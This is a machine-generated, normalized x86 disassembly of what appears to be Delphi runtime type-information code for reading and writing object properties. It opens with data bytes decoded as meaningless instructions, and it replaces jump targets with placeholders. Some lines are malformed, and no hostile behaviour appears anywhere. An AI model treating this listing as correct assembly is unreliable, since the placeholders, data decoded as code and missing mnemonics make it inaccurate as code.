jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x5e
popad
outsb
je r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 2 ] dh
add [ eax + eax ] cl
add [ eax ] al
in al dx
jb r-xdata
fcomp [ gs : ebp + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
pop ebp
inc ecx
sub_415e78
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
pop ecx
pop edx
pop ebx
retn
sub_415ea4
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_403194
mov ecx [ esp ]
mov edx esi
call sub_415ec4
pop edx
pop esi
pop ebx
retn
sub_415ec4
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_40348c
mov ecx [ esp ]
mov edx esi
call sub_41671c
pop edx
pop esi
pop ebx
retn
sub_415ee4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41613b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_415a14
mov ecx [ r-xdata ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_415ea4
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_415e78
jmp r-xdata
lea eax [ esi + 0x1 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
jmp [ eax * 4 + jump_table_415f55 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416142
lea eax [ ebp - 0x18 ]
call sub_4046a8
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fc0
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416754
mov edx eax
mov eax edi
mov cl 0xfc
call sub_4135f0
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416f4c
mov eax edi
call sub_4137e8
jmp r-xdata
mov eax edi
lea edx [ esi + 0x1 ]
call sub_413850
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416d24
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_413824
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416d90
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4138a0
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417270
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417328
push edx
push eax
mov eax edi
call sub_4136ec
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416754
mov edx eax
mov eax [ ebx ]
mov ecx [ eax ]
mov eax edi
call sub_414620
jmp r-xdata
mov eax esi
call sub_416518
mov eax [ eax + 0x9 ]
mov eax [ eax ]
cmp eax [ r-xdata ]
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416824
mov edx [ ebp - 0xc ]
mov eax edi
call sub_413824
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416754
mov edx eax
mov eax edi
mov cl 0xfc
call sub_4135f0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416898
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_413824
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416754
mov edx eax
mov eax edi
mov cl 0xfc
call sub_4135f0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416754
mov edx eax
mov eax edi
call sub_4137c0
jmp r-xdata
sub_416150
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
call sub_411768
call sub_402a20
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x14 ]
jne r-xdata
jl r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x10
jmp r-xdata
sub_4161b8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_41646c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ r-xdata ]
mov edx esi
mov eax edi
call sub_415ea4
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_416518
mov esi eax
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_415e78
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax ]
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
jmp [ eax * 4 + jump_table_416227 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416473
lea eax [ ebp - 0x18 ]
call sub_4046a8
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fc0
retn
mov eax [ esi + 0x5 ]
cmp eax [ esi + 0x1 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_413e30
cmp ax 0x100
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_413e30
cmp ax 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_411768
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx ebx
mov eax edi
call sub_417064
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_413e78
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax edi
call sub_416d64
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_413ebc
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax edi
call sub_416e78
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_4172b0
jmp r-xdata
push ebp
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
call sub_416150
pop ecx
push edx
push eax
mov edx ebx
mov eax edi
call sub_417350
jmp r-xdata
mov eax [ ebx ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_414970
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax edi
call sub_4167c8
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x5 ]
xor edx edx
push edx
push eax
call sub_416150
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_4167c8
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_416150
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_4167c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_413e30
cmp ax 0xb
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_413e78
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
call sub_416848
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_413e78
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax edi
call sub_416ac8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fe18
mov ecx eax
mov edx ebx
mov eax edi
call sub_4167c8
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_416150
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_4167c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_411768
call sub_402a20
test edx edx
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_4167c8
jmp r-xdata
neg eax
adc edx 0x0
neg edx
sub_416480
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4164db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov cl 0x1
mov edx [ ebp + 0x8 ]
call sub_415ee4
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f510
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4164e2
lea eax [ ebp - 0x10 ]
call sub_40f1fc
retn
sub_4164f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_4161b8
mov al 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_416524
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4165e2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_416518
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_416518
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_4082b4
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_403ff0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_408080
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4165e9
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407fa0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_403ff0
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_404200
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_4165fc
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_416648
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_416518
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4083f0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4165fc
mov edx [ rw-data ]
mov eax esi
call sub_408080
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_408080
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4083f0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_4166ac
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_41671c
push ebx
push ecx
mov [ esp ] ecx
call sub_4166ac
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov eax [ r-xdata ]
cmp eax [ esp ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
cmp al 0x1f
ja r-xdata
jb r-xdata
and eax 0x7f
bt [ esp ] eax
xor ebx ebx
sub_416754
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_4167c8
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_416824
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_416754
mov edx eax
mov ecx edi
mov eax [ ebx ]
mov eax [ eax ]
call sub_416524
pop edi
pop esi
pop ebx
retn
sub_416848
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
mov edx esi
call sub_416648
test eax eax
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_4167c8
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
sub_416898
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
call sub_416754
mov edx eax
mov ecx ebx
mov eax edi
call sub_4168c4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4168c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_416978
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f9c
mov eax [ ebp - 0x4 ]
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_416518
mov eax [ eax + 0x1 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
xor ebx ebx
jae r-xdata
bt edi eax
inc ebx
cmp ebx 0x20
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax ebx
cmp eax 0x1f
ja r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_416524
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404264
mov eax esi
mov edx r-xdata
call sub_404264
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41697f
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
push r-xdata
push [ esi ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_40431c
sub_4169ac
push ebx
push esi
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
test al al
je r-xdata
mov eax edx
mov edx [ esi ]
mov ecx ebx
call sub_40408c
jmp r-xdata
sub al 0x20
je r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
sub al 0x20
je r-xdata
sub al 0xc
je r-xdata
inc ebx
sub al 0xc
je r-xdata
sub al 0x31
jne r-xdata
sub al 0x31
je r-xdata
inc ebx
add [ esi ] ebx
pop esi
pop ebx
retn
sub_4169f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_416ab7
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416abe
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov eax edi
call sub_40445c
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x20
je r-xdata
inc [ ebp - 0x4 ]
sub al 0x3b
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_416518
mov eax [ eax + 0x1 ]
mov edi [ eax ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4169ac
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_416648
mov ebx eax
test ebx ebx
jge r-xdata
cmp ebx 0x1f
ja r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4169ac
bts esi ebx
sub_416ac8
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx edi
mov eax ebx
call sub_4169f0
mov ecx eax
mov edx ebx
mov eax esi
call sub_4167c8
pop edi
pop esi
pop ebx
retn
sub_416aec
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_416b30
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_416bac
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404238
mov ecx esp
mov edx esi
mov eax ebx
call sub_416b30
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_416bf4
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_416be0
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_416c34
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_416be0
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_416c74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416cbc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_416d90
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416cc3
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
sub_416ccc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416d14
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4047f4
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_416e78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d1b
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
sub_416d24
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_416b84
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_416bf4
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_416c74
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_403f9c
pop ebx
retn
sub_416d64
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_416bac
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_416c34
pop ebx
retn
dec bl
je r-xdata
call sub_416ccc
jmp r-xdata
pop ebx
retn
sub_416d90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416e68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_416d24
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4047f4
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e6f
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4046e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4046a8
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_416e78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416f3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404224
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_416d64
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f45
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4046e4
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_416f4c
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_416518
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_416f8c ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
